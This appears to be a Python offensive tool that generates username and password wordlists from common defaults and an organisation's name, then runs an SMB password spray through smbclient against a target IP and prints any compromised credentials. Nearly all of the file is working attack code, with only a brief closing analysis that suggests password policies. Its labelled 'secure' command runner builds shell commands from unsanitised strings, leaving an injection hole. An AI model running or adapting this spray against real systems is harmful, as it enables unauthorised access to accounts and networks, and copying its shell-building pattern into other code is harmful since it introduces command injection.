#!/usr/bin/env python3

import subprocess
import json
import os
import re
from datetime import datetime
import pandas as pd
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import CountVectorizer
import joblib

class CredentialPredictor:
    def __init__(self):
        self.model_path = 'models/credential_predictor.joblib'
        self.common_patterns = {
            'company_name': ['company', 'corp', 'inc', 'ltd', 'enterprise'],
            'seasons': ['spring', 'summer', 'autumn', 'winter', 'fall'],
            'years': [str(datetime.now().year), str(datetime.now().year - 1)],
            'special_chars': ['!', '@', '#', '$', '%']
        }
        self.model = None
        self.load_model()
        
    def load_model(self):
        """Load trained ML model for credential prediction"""
        try:
            if os.path.exists(self.model_path):
                self.model = joblib.load(self.model_path)
        except:
            self.model = None

    def generate_intelligent_wordlist(self, target_ip, org_info=None, max_words=500):
        """AI-generated wordlist based on target analysis with size limit"""
        # Base words (prioritized by frequency)
        base_words = [
            'admin', 'administrator', 'root', 'user', 'test', 'guest', 
            'password', 'pass', 'pwd', 'welcome', 'changeme', 'default'
        ]
        
        # Add organization-specific words if available
        org_words = []
        if org_info:
            org_name = org_info.lower()
            if 'company' in org_name:
                org_words.extend(['company', 'corp', 'business'])
            if 'tech' in org_name:
                org_words.extend(['tech', 'technology', 'it'])
            if 'school' in org_name:
                org_words.extend(['school', 'education', 'student'])
        
        # Start with base words and org words
        intelligent_list = set(base_words + org_words)
        
        # Use ML to predict most likely patterns if model exists
        if self.model and org_info:
            predicted_patterns = self.predict_org_patterns(org_info)
            intelligent_list.update(predicted_patterns[:50])  # Top 50 predicted patterns
        
        # Generate intelligent permutations (limited)
        current_list = list(intelligent_list)
        for word in current_list:
            # Add year variations
            for year in self.common_patterns['years']:
                if len(intelligent_list) < max_words:
                    intelligent_list.add(f"{word}{year}")
            
            # Add special character variations (limited)
            for char in self.common_patterns['special_chars'][:2]:  # Only 2 most common
                if len(intelligent_list) < max_words:
                    intelligent_list.add(f"{word}{char}")
        
        return list(intelligent_list)[:max_words]  # Enforce max limit

    def predict_org_patterns(self, org_info):
        """Predict organization-specific password patterns using ML"""
        if not self.model:
            return []
            
        # Extract features from org info
        features = self.extract_org_features(org_info)
        
        # Predict likely patterns (simplified example)
        try:
            # This would use the trained model to predict patterns
            # For now, return some intelligent guesses
            org_name_clean = re.sub(r'[^a-z]', '', org_info.lower())
            return [
                f"{org_name_clean}123",
                f"{org_name_clean}2023",
                f"{org_name_clean}!",
                f"admin{org_name_clean}",
                f"welcome{org_name_clean}"
            ]
        except:
            return []

    def extract_org_features(self, org_info):
        """Extract features from organization information for ML"""
        # Simple feature extraction - would be enhanced with real ML
        features = {
            'length': len(org_info),
            'word_count': len(org_info.split()),
            'has_digits': int(any(char.isdigit() for char in org_info)),
            'has_special': int(any(not char.isalnum() for char in org_info)),
            'common_industry': int(any(industry in org_info.lower() for industry in 
                                    ['tech', 'finance', 'health', 'education']))
        }
        return features

    def optimize_attack_order(self, usernames, passwords, max_combinations=1000):
        """Optimize credential attack order using ML with combination limit"""
        # First, prioritize using ML if available
        if self.model and len(usernames) * len(passwords) > max_combinations:
            return self.ml_optimize_attack_order(usernames, passwords, max_combinations)
        
        # Fallback to heuristic optimization
        return self.heuristic_optimize_attack_order(usernames, passwords, max_combinations)

    def ml_optimize_attack_order(self, usernames, passwords, max_combinations):
        """ML-based optimization of attack order"""
        features = []
        credentials = []
        
        # Sample a subset for prediction if too large
        sample_size = min(1000, len(usernames) * len(passwords))
        user_sample = usernames[:min(20, len(usernames))]
        password_sample = passwords[:min(50, len(passwords))]
        
        for username in user_sample:
            for password in password_sample:
                # Create feature vector
                user_len = len(username)
                pass_len = len(password)
                user_common = 1 if username in ['admin', 'administrator', 'root'] else 0
                pass_common = 1 if password in self.get_common_passwords() else 0
                pass_strength = self.predict_password_strength(password)
                
                features.append([user_len, pass_len, user_common, pass_common, pass_strength])
                credentials.append((username, password))
        
        # Predict probabilities using ML model
        if self.model and features:
            try:
                probabilities = self.model.predict_proba(features)[:, 1]  # Probability of success
                # Sort by probability (descending)
                sorted_indices = np.argsort(probabilities)[::-1]
                optimized = [credentials[i] for i in sorted_indices]
                
                # If we have more combinations than max, return top ones
                return optimized[:max_combinations]
            except:
                pass
        
        # Fallback if ML fails
        return self.heuristic_optimize_attack_order(usernames, passwords, max_combinations)

    def heuristic_optimize_attack_order(self, usernames, passwords, max_combinations):
        """Heuristic optimization of attack order"""
        optimized = []
        
        # Phase 1: Empty password with common usernames
        for user in ['administrator', 'admin', 'root', 'guest']:
            if user in usernames and len(optimized) < max_combinations:
                optimized.append((user, ''))
        
        # Phase 2: Common passwords with common usernames
        common_passwords = self.get_common_passwords()
        for pwd in common_passwords:
            for user in ['administrator', 'admin', 'root', 'guest']:
                if user in usernames and len(optimized) < max_combinations:
                    optimized.append((user, pwd))
        
        # Phase 3: All combinations of common passwords with all usernames
        for pwd in common_passwords:
            for user in usernames:
                if len(optimized) < max_combinations and (user, pwd) not in optimized:
                    optimized.append((user, pwd))
        
        # Phase 4: Remaining combinations
        for pwd in passwords:
            for user in usernames:
                if len(optimized) < max_combinations and (user, pwd) not in optimized:
                    optimized.append((user, pwd))
        
        return optimized

    def predict_password_strength(self, password):
        """Predict password strength using ML features"""
        # [Previous implementation remains the same]
        features = {
            'length': len(password),
            'has_upper': any(c.isupper() for c in password),
            'has_lower': any(c.islower() for c in password),
            'has_digit': any(c.isdigit() for c in password),
            'has_special': any(not c.isalnum() for c in password),
            'is_common': password in self.get_common_passwords(),
            'entropy': self.calculate_entropy(password)
        }
        
        # Simple strength calculation
        strength = 0
        strength += min(20, features['length'] * 2)
        strength += 10 if features['has_upper'] else 0
        strength += 10 if features['has_lower'] else 0
        strength += 15 if features['has_digit'] else 0
        strength += 20 if features['has_special'] else 0
        strength -= 30 if features['is_common'] else 0
        strength += min(25, features['entropy'] / 2)
        
        return max(0, min(100, strength))

    def get_common_passwords(self):
        """Return list of most common passwords"""
        return [
            'password', '123456', 'qwerty', 'admin', 'welcome', 'password123',
            'letmein', 'monkey', 'sunshine', 'password1', '123456789', '12345678',
            '12345', '1234567', '1234567890', 'abc123', 'password1', 'password!',
            'admin123', 'welcome123'
        ]

    def calculate_entropy(self, password):
        """Calculate password entropy"""
        import math
        charset_size = 0
        if any(c.islower() for c in password):
            charset_size += 26
        if any(c.isupper() for c in password):
            charset_size += 26
        if any(c.isdigit() for c in password):
            charset_size += 10
        if any(not c.isalnum() for c in password):
            charset_size += 10
        
        if charset_size == 0:
            return 0
        
        return len(password) * math.log2(charset_size)

# Global predictor instance
credential_predictor = CredentialPredictor()

def run_command(command, timeout=300):
    """Secure command execution"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return {
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': 'Command timed out', 'output': ''}
    except Exception as e:
        return {'success': False, 'error': str(e), 'output': ''}

def generate_username_list(target_ip, org_info=None, max_usernames=50):
    """AI-enhanced username generation with limit"""
    print(f"[*] Generating intelligent username list for {target_ip}")
    
    # Base username list (prioritized)
    usernames = [
        'administrator', 'admin', 'guest', 'user', 'test', 'root', 'backup',
        'web', 'www', 'sql', 'db', 'oracle', 'ftp', 'ssh', 'rdp', 'support',
        'helpdesk', 'service', 'info'
    ]
    
    # Add organization-specific usernames if info available
    if org_info:
        org_name = org_info.lower()
        if 'company' in org_name:
            usernames.extend(['company', 'corp', 'business'])
        if 'tech' in org_name:
            usernames.extend(['tech', 'technology', 'it'])
        if 'school' in org_name:
            usernames.extend(['school', 'education', 'teacher'])
    
    # Add common variations (limited)
    variations = []
    for user in usernames:
        variations.extend([user, f"{user}1", f"{user}123", f"{user}{datetime.now().year}"])
    
    # Remove duplicates and limit size
    unique_variations = list(set(variations))
    return unique_variations[:max_usernames]

def generate_password_list(target_ip, org_info=None, max_passwords=200):
    """AI-generated password list with limit"""
    print(f"[*] Generating intelligent password list for {target_ip}")
    
    # Get AI-generated wordlist (limited size)
    intelligent_words = credential_predictor.generate_intelligent_wordlist(target_ip, org_info, max_passwords//2)
    
    # Common passwords (prioritized)
    common_passwords = credential_predictor.get_common_passwords()
    
    # Combine and deduplicate
    all_passwords = list(set(common_passwords + intelligent_words))
    
    # Sort by predicted strength (weakest first for faster cracking)
    password_strengths = [(pwd, credential_predictor.predict_password_strength(pwd)) for pwd in all_passwords]
    password_strengths.sort(key=lambda x: x[1])  # Sort by strength (weakest first)
    
    return [pwd for pwd, strength in password_strengths][:max_passwords]

def smb_password_spray(target_ip, usernames, passwords, max_attempts=2000):
    """AI-optimized SMB password spraying with attempt limit"""
    print(f"[*] Starting AI-optimized SMB password spray against {target_ip}")
    
    results = {}
    successful_logins = []
    
    # Optimize attack order with combination limit
    optimized_credentials = credential_predictor.optimize_attack_order(
        usernames, passwords, max_attempts
    )
    
    total_attempts = len(optimized_credentials)
    print(f"[*] AI optimized {total_attempts} credential combinations (reduced from {len(usernames) * len(passwords)})")
    
    for i, (username, password) in enumerate(optimized_credentials, 1):
        if i % 100 == 0:  # Progress update every 100 attempts
            print(f"   Progress: {i}/{total_attempts} ({i/total_attempts:.1%})")
        
        # Try each username with this password
        if password:
            cmd = f"echo '{password}' | smbclient -U '{username}%{password}' //{target_ip}/IPC$ -c 'quit' 2>&1"
        else:
            cmd = f"smbclient -U '{username}' -N //{target_ip}/IPC$ -c 'quit' 2>&1"
        
        result = run_command(cmd, timeout=30)
        
        # Store result
        if password not in results:
            results[password] = {}
        results[password][username] = result
        
        # Check for successful authentication
        if (result['success'] or 
            ('NT_STATUS_OK' in result.get('error', '')) or
            ('session setup' in result.get('output', '').lower() and 'failed' not in result.get('output', '').lower())):
            
            print(f"[+] SUCCESS: {username}:{password}")
            successful_logins.append({'username': username, 'password': password, 'result': result})
            
            # Early termination if we get multiple successes
            if len(successful_logins) >= 3:
                print('[*] Multiple successes detected, stopping spray early')
                break
    
    return {
        "spray_results": results,
        'successful_logins': successful_logins,
        'total_attempts': total_attempts,
        'success_rate': len(successful_logins) / total_attempts if total_attempts > 0 else 0
    }

# [Rest of the functions remain similar but will use the optimized functions above]

def run_credential_attacks(target_ip, org_info=None):
    """AI-powered credential attack suite with optimized performance"""
    print(f"\n{'='*60}")
    print(f"AI CREDENTIAL ATTACKS - Target: {target_ip}")
    print(f"{'='*60}")
    
    results = {
        'target': target_ip,
        'timestamp': datetime.now().isoformat(),
        'credential_attacks': {},
        'ai_analysis': {}
    }
    
    # Generate intelligent wordlists with limits
    usernames = generate_username_list(target_ip, org_info, max_usernames=50)
    passwords = generate_password_list(target_ip, org_info, max_passwords=200)
    
    print(f"[+] Generated {len(usernames)} usernames and {len(passwords)} passwords")
    print(f"[+] Total possible combinations: {len(usernames) * len(passwords)}")
    print(f"[+] AI will optimize and test max 2000 combinations")
    
    # Run credential attacks with attempt limit
    results['credential_attacks']['smb_spray'] = smb_password_spray(
        target_ip, usernames, passwords, max_attempts=2000
    )
    
    # AI analysis of results
    results['ai_analysis'] = analyze_credential_results(results['credential_attacks'])
    
    # Save results
    os.makedirs('results/credential_attacks', exist_ok=True)
    filename = f'results/credential_attacks/credential_attack_{target_ip}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    
    with open(filename, 'w') as f:
        json.dump(results, f, indent=4)
    
    print(f"[+] Credential attack results saved to {filename}")
    
    # Print summary
    print(f"\n# Credential Attack Summary:")
    total_successes = len(results['credential_attacks']['smb_spray']['successful_logins'])
    
    print(f"   Successful Logins: {total_successes}")
    print(f"   Success Rate: {results['credential_attacks']['smb_spray']['success_rate']:.2%}")
    print(f"   Total Attempts: {results['credential_attacks']['smb_spray']['total_attempts']}")
    
    if total_successes > 0:
        print(f"\n# Compromised Credentials:")
        for login in results['credential_attacks']['smb_spray']['successful_logins']:
            print(f"   {login['username']}:{login['password']}")
    
    return results

# Rest of the file remains the same

def analyze_credential_results(attack_results):
    """AI analysis of credential attack results"""
    analysis = {
        'authentication_strength': 'STRONG',
        'common_passwords_found': [],
        'password_policy_analysis': {},
        'security_recommendations': []
    }
    
    # Analyze SMB results
    smb_results = attack_results.get('smb_spray', {})
    if smb_results.get('success_rate', 0) > 0.1:  # More than 10% success
        analysis['authentication_strength'] = 'WEAK'
    elif smb_results.get('success_rate', 0) > 0.01:  # More than 1% success
        analysis['authentication_strength'] = 'MODERATE'
    
    # Find common passwords in successful logins
    for login in smb_results.get('successful_logins', []):
        password = login.get('password', '')
        if password in credential_predictor.get_common_passwords():
            analysis['common_passwords_found'].append(password)
    
    # Generate recommendations
    if analysis['authentication_strength'] == 'WEAK':
        analysis['security_recommendations'].append({
            'priority': 'HIGH',
            'action': 'Implement strong password policy',
            'details': 'High success rate in credential attacks'
        })
    
    if analysis['common_passwords_found']:
        analysis['security_recommendations'].append({
            'priority': 'HIGH',
            'action': 'Enforce password complexity requirements',
            'details': f'Common passwords found: {", ".join(set(analysis["common_passwords_found"]))}'
        })
    
    return analysis

if __name__ == "__main__":
    target = "10.0.3.20"
    results = run_credential_attacks(target)
    print(f"\nCredential attacks completed. Success rate: {results['credential_attacks']['smb_spray']['success_rate']:.2%}")
